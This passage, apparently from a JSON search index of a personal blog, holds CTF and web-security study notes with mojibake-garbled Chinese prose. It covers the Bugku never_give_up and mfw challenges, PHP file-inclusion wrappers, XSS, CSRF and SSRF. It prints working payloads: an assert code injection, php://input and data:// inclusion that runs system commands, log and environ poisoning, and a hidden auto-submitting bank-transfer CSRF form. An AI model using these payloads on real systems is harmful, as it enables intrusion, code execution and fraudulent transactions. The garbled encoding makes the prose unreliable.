æ„å»ºç«™ç‚¹åœ°å›¾\n\næµ‹è¯•Web Appçš„é¦–è¦ä»»åŠ¡å°±æ˜¯è·å–ç«™ç‚¹å®Œæ•´çš„ç›®å½•å’Œæ–‡ä»¶\n\n###### æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ\n\n1ã€é€šè¿‡åŸºäºå­—å…¸çš„ç›®å½•æ–‡ä»¶æ‰«æ\n\n2ã€é€šè¿‡åŸºäºç½‘ç»œçˆ¬è™«çš„æŠ€æœ¯ï¼ˆå¯é€šè¿‡requestsåº“æ„å»ºï¼Œä½†æ˜¯å¾ˆå¤æ‚ï¼Œæœ‰scrapyåº“å¯ç”¨äºæ„å»ºçˆ¬è™«ï¼‰\n\n3ã€é€šè¿‡Burpsuiteæ„å»ºç½‘ç«™åœ°å›¾\n","tags":["web"]},{"title":"post","url":"/2022/01/25/post/"},{"title":"Bugku never_give_up","url":"/2022/01/19/Bugku-never-give-up/","content":"\n# Bugku never_give_up\n\næŸ¥çœ‹æºä»£ç å¥½çš„æç¤ºè®¿é—®1p.html\n\n```html\n<HTML>\n<HEAD>\n    <SCRIPT LANGUAGE=\"Javascript\">\n    //\n\n\n    var Words = \"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\"\n    function OutWord()\n    {\n        var NewWords;\n        NewWords = unescape(Words);\n        document.write(NewWords);\n    }\n    OutWord();\n    // -->\n    </script>\n</HEAD>\n<BODY></BODY>\n</HTML>\n\n\n```\n\n<!--more-->\n\næŸ¥çœ‹å‡½æ•°å¾—çŸ¥æ˜¯å°†`Words`ä¸­çš„å†…å®¹è§£ç åæ‰§è¡Œ\n\nç»è¿‡URLè§£ç ä¸base64è§£ç åhello.phpçš„ä»£ç å¦‚ä¸‹\n\n```php+HTML\n<script>window.location.href='http://www.bugku.com';</script> \n<!--\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>-->\n```\n\nä¸»è¦åˆ¤æ–­è¯­å¥ä¸ºï¼š\n\n```php\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n```\n\ndataçš„æ•°æ®æ¥è‡ªfile_get_contentså‡½æ•°ï¼Œå¯ä»¥é€šè¿‡phpä¼ªåè®®ä¸­çš„php://inputæ¥ä¼ªé€ \n\nid==0ä¸ºå¼±ç›¸ç­‰ï¼Œè€Œç”±äºå‰é¢åˆ¤æ–­idæ‰€ä»¥idä¸èƒ½ç›´æ¥ç­‰äº0ï¼Œå¯ä»¥è®©id=%00ï¼Œ.ï¼Œ0e1ï¼Œå­—æ¯å­—ç¬¦ç­‰ç»•è¿‡\n\nbé•¿åº¦å¤§äº5å¹¶ä¸”é¦–ä½ä¸ä¸º4ï¼Œå¹¶ä¸”\"1114\"å­—ç¬¦ä¸²ä¸­å­˜åœ¨ç¬¦åˆ\"111\".substr($b,0,1)è¯¥è§„åˆ™çš„å†…å®¹\n\næŸ¥è¯¢æ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹æ®Šå­—ç¬¦å¾—çŸ¥ï¼Œæ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦å¦‚ä¸‹\n\n|      | ç‰¹æ®Šå­—ç¬¦                                             |\n| ---- | ---------------------------------------------------- |\n| +    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡                         |\n| .    | åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦                     |\n| *    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡                         |\n| ?    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ |\n|      |                                                      |\n\næ‰€ä»¥è®©bå­—ç¬¦ä¸²å¼€å¤´å­—ç¬¦ä¸ºä¸Šè¿°ä»»ä¸€å­—ç¬¦å°±è¡Œ\n\npayloadï¼š\n\n```\n?id=a&b=*12345&a=php://input\nbody:\nbugku is a nice plateform!\n```\n\næ‹¿åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/NGV.png)\n","tags":["CTF","web"]},{"title":"é€»è¾‘æ¼æ´","url":"/2022/01/19/é€»è¾‘æ¼æ´/","content":"\n# é€»è¾‘æ¼æ´\n\n1ã€å¯†ç æ‰¾å›ï¼Œä»»æ„ç”¨æˆ·æ³¨å†Œ\n\næ³¨å†Œæ—¶æŠ“åŒ…è¯·æ±‚å¤´å†…å®¹ï¼Œå¹¶ä¸”åœ¨å¾—åˆ°è¿”å›é“¾æ¥æ—¶å¯¹æ¯”å†…å®¹ï¼Œæ‰¾å‡ºç¼–è§£ç æ–¹å¼\n\n<!--more-->\n\n2ã€æ”¯ä»˜æ¼æ´\n\næŠ“åŒ…ä¿®æ”¹ä»˜æ¬¾é‡‘é¢\n\n3ã€è¶Šæƒ\n\né€šè¿‡ç›´æ¥æ›´æ”¹URLä¸­çš„è¯·æ±‚å€¼ç›´æ¥æŸ¥çœ‹æˆ–æ›´æ”¹ä»–äººæ•°æ®\n\n4ã€\n","tags":["CTF","web"]},{"title":"æ”»é˜²ä¸–ç•Œmfw","url":"/2022/01/19/æ”»é˜²ä¸–ç•Œmfw/","content":"\n# æ”»é˜²ä¸–ç•Œmfw\n\nè¿›å…¥ç½‘é¡µæŸ¥çœ‹aboutå†…å®¹ï¼Œå‘ç°ç½‘é¡µä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬ç®¡ç†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw1.png)\n\nç½‘ç«™ååŠ .gitå‘ç°å­˜åœ¨gitæ³„æ¼![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw2.png)\n\n<!--more-->\n\nä½¿ç”¨GitHackè„šæœ¬è·å¾—æºç \n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");\n\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\t\t\n\t\t<title>My PHP Website</title>\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" />\n\t</head>\n\t<body>\n\t\t<nav class=\"navbar navbar-inverse navbar-fixed-top\">\n\t\t\t<div class=\"container\">\n\t\t    \t<div class=\"navbar-header\">\n\t\t    \t\t<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n\t\t            \t<span class=\"sr-only\">Toggle navigation</span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t          \t</button>\n\t\t          \t<a class=\"navbar-brand\" href=\"#\">Project name</a>\n\t\t        </div>\n\t\t        <div id=\"navbar\" class=\"collapse navbar-collapse\">\n\t\t          \t<ul class=\"nav navbar-nav\">\n\t\t            \t<li <?php if ($page == \"home\") { ?>class=\"active\"<?php } ?>><a href=\"?page=home\">Home</a></li>\n\t\t            \t<li <?php if ($page == \"about\") { ?>class=\"active\"<?php } ?>><a href=\"?page=about\">About</a></li>\n\t\t            \t<li <?php if ($page == \"contact\") { ?>class=\"active\"<?php } ?>><a href=\"?page=contact\">Contact</a></li>\n\t\t\t\t\t\t<!--<li <?php if ($page == \"flag\") { ?>class=\"active\"<?php } ?>><a href=\"?page=flag\">My secrets</a></li> -->\n\t\t          \t</ul>\n\t\t        </div>\n\t\t    </div>\n\t\t</nav>\n\t\t\n\t\t<div class=\"container\" style=\"margin-top: 50px\">\n\t\t\t<?php\n\t\t\t\trequire_once $file;\n\t\t\t?>\n\t\t\t\n\t\t</div>\n\t\t\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\" />\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\" />\n\t</body>\n</html>\n\n```\n\nassert()å‡½æ•°å°†å†…å®¹å½“ä½œphpå‘½ä»¤æ‰§è¡Œï¼Œstrpos()å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²1ä¸­å­—ç¬¦ä¸²2é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå°è¯•é€šè¿‡é—­åˆæ„é€ å‘½ä»¤\n\n```php\nassert(\"strpos('$file', '..') === false\")\n```\n\né¦–å…ˆä½¿ç”¨')é—­åˆstrposå‡½æ•°è€Œåè¾“å…¥.å‘½ä»¤æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæœ€ååŠ å…¥//æ³¨é‡Šåé¢å†…å®¹\n\nå®Œæ•´payloadï¼š\n\n```\n?page=').phpinfo();//\n```\n\nä¼ å…¥ååŸå‡½æ•°å˜ä¸º\n\n```php\nassert(\"strpos('').phpinfo();//', '..') === false\")\n```\n\næ‰§è¡ŒæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw3.png)\n\néšåé€šè¿‡system()å‡½æ•°å¾—åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw4.png)\n","tags":["CTF","web"]},{"title":"æ–‡ä»¶åŒ…å«","url":"/2022/01/18/æ–‡ä»¶åŒ…å«/","content":"\n# æ–‡ä»¶åŒ…å«\n\nå¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´å‡½æ•°ï¼šinclude()ï¼Œrequire()\n\n### æœ¬åœ°åŒ…å«\n\n#### åˆ©ç”¨æ–¹å¼ï¼š\n\n###### 1ã€php://inputï¼š\n\n```\n?file=php://input\nè¯·æ±‚ä½“å†…ä¸ºPHPä»£ç ï¼š<?php phpinfo(); ?>\n```\n\nphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://inputï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\né‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚\n\n<!--more-->\n\n###### 2ã€php://filterï¼š\n\n```\n?file=php://filter/rescource=xxx.php\nä»¥base64ç¼–ç è¯»å–\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚\n\n###### 3ã€zip://ï¼š\n\n```\n?file=zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]\n```\n\nzip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n- zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚\n- è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23\n- åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚\n- ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://\n\n###### 4ã€data://ï¼š\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\nä¸‹é¢ä¸ºç¤ºä¾‹\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n###### 5ã€phar//ï¼š\n\n```\n?file=phar://å‹ç¼©åŒ…è·¯å¾„ï¼ˆç›¸å¯¹ç»å¯¹éƒ½å¯ï¼‰/å‹ç¼©åŒ…å†…æ–‡ä»¶\n```\n\néœ€è¦phar://æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n#### å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š\n\n###### 1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š\n\n###### **æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•**\n\n**æ³¨æ„äº‹é¡¹ï¼š**ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•è¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼ˆhttpdï¼Œconfï¼Œnginxï¼Œconf...ï¼‰æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥ã€‚è¿˜æœ‰å°±æ˜¯æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§æˆ–è€…å†…å®¹æ ¼å¼ã€‚\n\nApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚\n\nå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http://www.xxxx.com/<?php phpinfo(); ?>,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ<?php phpinfo(); ?> å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚\n\nå¯ä»¥æ”¾åœ¨User-Agentä¸­\n\n###### 2ã€åŒ…å«SESSION\n\n**æ¡ä»¶ï¼š**æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡ï¼Œå¹¶ä¸”Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ï¼ŒPHPä¸­SESSIONæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°\n\n**å¸¸è§è·¯å¾„ï¼š**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsessionæ–‡ä»¶æ ¼å¼ï¼š sess_[phpsessid] ï¼Œè€Œ phpsessid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚\n\n\n###### 3ã€åŒ…å«/pros/self/environ\n\n**å†…å®¹ï¼š**proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ï¼Œå¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ï¼Œä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚\n\n**æ¡ä»¶ï¼š**phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚\n\n###### 4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶\n\nphpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\\Winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\n\nç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚\n\nå¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚\n","tags":["CTF","web"]},{"title":"XSS","url":"/2022/01/13/XSSæ³¨å…¥/","content":"\n# XSS\n\n#### å†…å®¹ï¼š\n\nå…¨ç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§Webåº”ç”¨ç¨‹åºçš„æ¼æ´ï¼Œæ¥è‡ªç”¨æˆ·çš„ä¸å¯ä¿¡æ•°æ®åœ¨æ²¡æœ‰éªŒè¯çš„æƒ…å†µä¸‹è¢«åº”ç”¨ç¨‹åºè¿›è¡Œäº†å¤„ç†ï¼Œæ²¡æœ‰æ­£ç¡®è½¬ä¹‰ï¼ˆescapeï¼‰æˆ–ç¼–ç ï¼ˆencodeï¼‰åå°„å›æµè§ˆå™¨ï¼Œå¯¼è‡´æµè§ˆå™¨å¼•æ“æ‰§è¡Œäº†éé¢„æœŸä»£ç \n\n#### ç±»å‹ï¼š\n\n###### åå°„æ€§ï¼šç›´æ¥ä¼ è¾“ä»£ç åï¼Œç»è¿‡åç«¯æ¸²æŸ“ä»£ç ç›´æ¥æ”¾å…¥äº†å‰ç«¯é¡µé¢ä¸­\n\n###### å­˜å‚¨å‹ï¼šå°†ä»£ç ç»è¿‡åç«¯å¤„ç†å­˜å…¥æ•°æ®åº“ï¼Œå½“ä»æ•°æ®åº“æŸ¥è¯¢ç»å‰ç«¯æ¸²æŸ“åä»£ç è¢«æ‰§è¡Œ\n\n###### DOMå‹ï¼šä¸éœ€è¦ä»¥æ¥æœåŠ¡ç«¯ç›¸åº”å†…å®¹ï¼Œå¦‚æœHTMLé¡µé¢ä¸­ä½¿ç”¨äº†document.locationç­‰DOMå…ƒç´ çš„å±æ€§ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™äº›å±æ€§æ³¨å…¥æ¶æ„è„šæœ¬å®æ–½åŸºäºDOMçš„è·¨ç«™è„šæœ¬æ”»å‡»\n\n<!--more-->\n\n#### DOMï¼š\n\nDocument Object Modelï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ï¼Œé€šè¿‡HTLM DOMï¼Œæ ‘ä¸­æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯é€šè¿‡JavaScriptè¿›è¡Œè®¿é—®ï¼Œä¿®æ”¹ï¼Œåˆ›å»ºï¼Œåˆ é™¤\n\n![DOMç¤ºæ„](/images/DOMç¤ºæ„.png)\n\nXSSç›²æ‰“ï¼š\n\næ„æ¶scriptæ ‡ç­¾ä½¿å—å®³è€…æ‰§è¡Œï¼Œé€šè¿‡document.locationå’Œdocument.cookieè·å–åˆ°å—å®³è€…çš„cookieåŠç®¡ç†é¡µé¢ç­‰éšç§å†…å®¹å¯¼è‡´ç½‘ç«™å†…å®¹æ³„æ¼\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRFï¼š\n\nè·¨ç«™è¯·æ±‚ä¼ªé€ \n\næ”»å‡»æµç¨‹ï¼šé€šè¿‡è·å–å—å®³çš„Cookieç­‰ä¿¡æ¯ï¼Œä¼ªé€ å¯¹åº”ç”¨æˆ·çš„è¯·æ±‚å¤´ï¼Œé€šè¿‡ç”¨æˆ·èº«ä»½![CSRF](/images/CSRF.jpg)\n\nä½¿ç”¨æ–¹æ³•ï¼šåˆ¶ä½œç½‘ç«™æ—¶å¯é€šè¿‡æ„é€ imgæ ‡ç­¾ç›´æ¥è®¿é—®ï¼Œå¦‚\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\næˆ–è€…é€šè¿‡JavaScriptæ„é€ postè¯·æ±‚å¹¶é€šè¿‡domå…ƒç´ ç›´æ¥æäº¤ï¼Œå¦‚\n\n```html\n<html>\nã€€ã€€<head>\nã€€ã€€ã€€ã€€<script type=\"text/javascript\">\nã€€ã€€ã€€ã€€ã€€ã€€function steal()\nã€€ã€€ã€€ã€€ã€€ã€€{\n          ã€€ã€€ã€€ã€€ iframe = document.frames[\"steal\"];\nã€€ã€€     ã€€ã€€      iframe.document.Submit(\"transfer\");\nã€€ã€€ã€€ã€€ã€€ã€€}\nã€€ã€€ã€€ã€€</script>\nã€€ã€€</head>\n\nã€€ã€€<body onload=\"steal()\">//é¡µé¢å®Œå…¨è½½å…¥åè§¦å‘\nã€€ã€€ã€€ã€€<iframe name=\"steal\" display=\"none\">\nã€€ã€€ã€€ã€€ã€€ã€€<form method=\"POST\" name=\"transfer\"ã€€action=\"http://www.myBank.com/Transfer.php\">\nã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<input type=\"hidden\" name=\"toBankId\" value=\"11\">\nã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<input type=\"hidden\" name=\"money\" value=\"1000\">\nã€€ã€€ã€€ã€€ã€€ã€€</form>\nã€€ã€€ã€€ã€€</iframe>\nã€€ã€€</body>\n</html>\n```\n\næˆ–è€…å®Œå…¨ä¼ªé€ åŸè¡¨å•ï¼Œå¹¶ä¸”å¡«å†™å¥½å†…å®¹ï¼Œé€šè¿‡javascriptç›´æ¥æäº¤\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        ç”¨æˆ·åï¼š<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        è½¬è´¦äººï¼š<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRFï¼š\n\næœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ \n\næ”»å‡»æµç¨‹ï¼šé€šè¿‡é¡µé¢ä¸­å¯è®¿é—®å…¶ä»–é¡µé¢çš„ä½ç½®é€šè¿‡æœåŠ¡ç«¯å‘èµ·è¯·æ±‚è¿›è€Œè·å–åˆ°å®¢æˆ·ç«¯æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ\n\næ”»å‡»ä½ç½®ï¼šæœ‰åœ¨çº¿ç¿»è¯‘ï¼Œé¡µé¢æ”¶è—ï¼Œå›¾ç‰‡åŠ è½½ä¸‹è½½ç­‰\n","tags":["CTF","web"]},{"title":"Pythoné¢å‘å¯¹è±¡","url":"/2022/01/11/Pythoné¢å‘å¯¹è±¡/","content":"\n# Pythoné¢å‘å¯¹è±¡\n\n#### ç±»çš„å®šä¹‰ï¼š\n\n```python\n#objectæ˜¯æ‰€æœ‰ç±»çš„åŸºç±»\n#æ¯ä¸ªå¯¹è±¡ä¼šä¿å­˜è‡ªå·±çš„å±æ€§ï¼Œä¸åŒå¯¹è±¡é—´å±æ€§æ²¡æœ‰å¿…ç„¶è”ç³»\n#ç±»å†…éƒ¨å¯é€šè¿‡selfæ“ä½œ\nclass ç±»å(object):\n  def å‡½æ•°å(self):\n    